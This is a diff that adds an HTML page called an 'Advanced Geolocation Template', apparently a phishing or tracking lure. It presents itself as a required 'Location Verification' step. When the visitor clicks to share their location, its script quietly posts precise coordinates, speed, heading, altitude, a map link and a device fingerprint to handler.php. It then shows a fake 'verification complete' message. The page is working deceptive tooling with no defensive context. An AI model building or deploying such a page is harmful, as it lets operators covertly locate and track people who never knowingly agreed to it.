@@ -1,0 +1,267 @@
+// Advanced Geolocation Template
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verify Your Location</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        h1 {
+            color: #667eea;
+            margin-bottom: 20px;
+            font-size: 2rem;
+        }
+        p {
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+        .icon {
+            font-size: 4rem;
+            margin-bottom: 20px;
+        }
+        .btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 600;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
+        }
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            display: none;
+        }
+        .status.show {
+            display: block;
+        }
+        .status.loading {
+            background: #fef3cd;
+            color: #856404;
+        }
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+        }
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+        }
+        #map {
+            width: 100%;
+            height: 300px;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: none;
+        }
+        .info-box {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            text-align: left;
+            display: none;
+        }
+        .info-box.show {
+            display: block;
+        }
+        .info-item {
+            margin: 8px 0;
+            font-size: 0.95rem;
+        }
+        .info-item strong {
+            color: #667eea;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">📍</div>
+        <h1>Location Verification</h1>
+        <p>We need to verify your location to continue. Click the button below to share your location.</p>
+        
+        <button class="btn" id="getLocation" onclick="getLocation()">
+            🌍 Share My Location
+        </button>
+        
+        <div class="status" id="status">
+            Getting your location...
+        </div>
+        
+        <div id="map"></div>
+        
+        <div class="info-box" id="infoBox">
+            <div class="info-item"><strong>Latitude:</strong> <span id="lat">-</span></div>
+            <div class="info-item"><strong>Longitude:</strong> <span id="lng">-</span></div>
+            <div class="info-item"><strong>Accuracy:</strong> <span id="acc">-</span></div>
+            <div class="info-item"><strong>Address:</strong> <span id="addr">Loading...</span></div>
+        </div>
+    </div>
+
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script>
+        let map;
+        
+        function getLocation() {
+            const btn = document.getElementById('getLocation');
+            const status = document.getElementById('status');
+            
+            btn.disabled = true;
+            status.className = 'status show loading';
+            status.textContent = '🔄 Getting your location...';
+            
+            if (!navigator.geolocation) {
+                status.className = 'status show error';
+                status.textContent = '❌ Geolocation is not supported by your browser';
+                btn.disabled = false;
+                return;
+            }
+            
+            navigator.geolocation.getCurrentPosition(
+                showPosition,
+                showError,
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+        
+        function showPosition(position) {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const acc = position.coords.accuracy;
+            const speed = position.coords.speed;
+            const heading = position.coords.heading;
+            const altitude = position.coords.altitude;
+            
+            // Update UI
+            document.getElementById('lat').textContent = lat.toFixed(6);
+            document.getElementById('lng').textContent = lng.toFixed(6);
+            document.getElementById('acc').textContent = acc.toFixed(2) + ' meters';
+            
+            const status = document.getElementById('status');
+            status.className = 'status show success';
+            status.textContent = '✅ Location obtained successfully!';
+            
+            document.getElementById('infoBox').classList.add('show');
+            
+            // Show map
+            const mapDiv = document.getElementById('map');
+            mapDiv.style.display = 'block';
+            
+            if (!map) {
+                map = L.map('map').setView([lat, lng], 13);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+            }
+            
+            L.marker([lat, lng]).addTo(map)
+                .bindPopup('You are here!')
+                .openPopup();
+            
+            // Reverse geocoding
+            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`)
+                .then(res => res.json())
+                .then(data => {
+                    document.getElementById('addr').textContent = data.display_name || 'Address not found';
+                })
+                .catch(() => {
+                    document.getElementById('addr').textContent = 'Address lookup failed';
+                });
+            
+            // Send to server
+            sendToServer({
+                latitude: lat,
+                longitude: lng,
+                accuracy: acc,
+                speed: speed,
+                heading: heading,
+                altitude: altitude,
+                timestamp: new Date().toISOString(),
+                map_link: `https://www.google.com/maps?q=${lat},${lng}`,
+                device_info: getDeviceInfo()
+            });
+        }
+        
+        function showError(error) {
+            const status = document.getElementById('status');
+            status.className = 'status show error';
+            
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    status.textContent = '❌ Location permission denied';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    status.textContent = '❌ Location information unavailable';
+                    break;
+                case error.TIMEOUT:
+                    status.textContent = '❌ Location request timed out';
+                    break;
+                default:
+                    status.textContent = '❌ An unknown error occurred';
+            }
+            
+            document.getElementById('getLocation').disabled = false;
+        }
+        
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+        }
+        
+        function sendToServer(data) {
+            fetch('handler.php', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).then(() => {
+                setTimeout(() => {
+                    document.getElementById('status').textContent = '✅ Verification complete! Redirecting...';
+                }, 1000);
+            });
+        }
+    </script>
+</body>
+</html>
